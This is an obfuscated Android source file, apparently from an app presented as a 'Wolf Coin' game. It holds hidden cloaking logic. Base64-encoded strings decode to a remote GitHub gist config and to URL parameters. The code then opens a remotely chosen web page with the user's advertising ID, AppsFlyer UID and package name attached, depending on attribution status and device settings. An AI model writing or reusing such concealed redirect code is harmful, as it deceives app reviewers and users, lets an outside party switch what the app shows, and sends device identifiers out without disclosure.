package com.wooollf.ccooiin.utedsd;

import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.annotation.RequiresApi;

import com.github.ybq.android.spinkit.SpinKitView;
import com.wooollf.ccooiin.utedsd.dus.Act;
import com.wooollf.ccooiin.utedsd.dus.Gfd;
import com.wooollf.ccooiin.utedsd.dus.Hids;
import com.wooollf.ccooiin.utedsd.dus.Uaaap;

public class Sddd {

   private SpinKitView spins;
   private Button bS,bP,bC;
   private WC wc;
   String [] dd;



    public Sddd(SpinKitView spins, Button bS, Button bP, Button bC, WC wc) {
        this.spins = spins;
        this.bS = bS;
        this.bP = bP;
        this.bC = bC;
        this.wc = wc;
        bS.setVisibility(View.INVISIBLE);
        bC.setVisibility(View.INVISIBLE);
        bP.setVisibility(View.INVISIBLE);
    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    public void usk(){

        Odod odod = new Odod();
        odod.setbS(bS);
        odod.setbP(bP);
        odod.setbC(bC);
        odod.setSpins(spins);
        odod.setWc(wc);

        int sda = Settings.Secure.getInt(wc.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
        int ijs = 1;



        if (sda == ijs){

            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        dd = Hids.fds("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzL2JkODRkNmMxNDhiNzQxOGE3NTJjMjI5YzMzNThkZDBmL3Jhdy9Xb2xmX0NvaW4=");

                        wc.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Gfd.gfd(dd[2],wc);
                                String dfsac = wc.getSharedPreferences(wc.getPackageName(), wc.MODE_PRIVATE).getString(Hids.deeeee("c2F2ZWRVcmw="), "oooods");

                                if (dfsac.equals("oooods")) {

                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            String ois = Uaaap.statusAppsFlyer;
                                            String qwq = null;
                                            if (ois.equals(Hids.deeeee("Tm9uLW9yZ2FuaWM="))){
                                                qwq = dd[0] + Uaaap.params ;
                                                Intent intent = new Intent(wc.getApplicationContext(), Act.class);
                                                intent.putExtra("wwweq",qwq);
                                                wc.startActivity(intent);
                                            }else if(Gfd.icbsa != null) {
                                                qwq = dd[0]+ Gfd.oknsa;

                                                Intent intent = new Intent(wc.getApplicationContext(), Act.class);
                                                intent.putExtra("wwweq",qwq);
                                                wc.startActivity(intent);
                                            }else {
                                                if (dd[1].equals(Hids.deeeee("Tk8="))) {
                                                    Odod.oodos();
                                                }else {
                                                    String isd = dd[1] + Hids.deeeee("P2J1bmRsZT0=") + wc.getPackageName() + Hids.deeeee("JmFkX2lkPQ==") + Uaaap.AID + Hids.deeeee("JmFwcHNfaWQ9") + Uaaap.appsFlyerUID
                                                            +  Hids.deeeee("JmRldl9rZXk9") + Hids.deeeee(Uaaap.aap);;
                                                    qwq = dd[0] + isd;
                                                    Intent intent = new Intent(wc.getApplicationContext(), Act.class);
                                                    intent.putExtra("wwweq",qwq);
                                                    wc.startActivity(intent);
                                                }
                                            }
                                        }
                                    },5000);

                                }else {
                                    Intent intent = new Intent(wc.getApplicationContext(), Act.class);
                                    intent.putExtra("wwweq",dfsac);
                                    wc.startActivity(intent);
                                }
                            }
                        });


                    }catch (Exception e){
                        Odod.oodos();
                    }
                }
            }).start();

        }else {
            Odod.oodos();

        }

    }

}
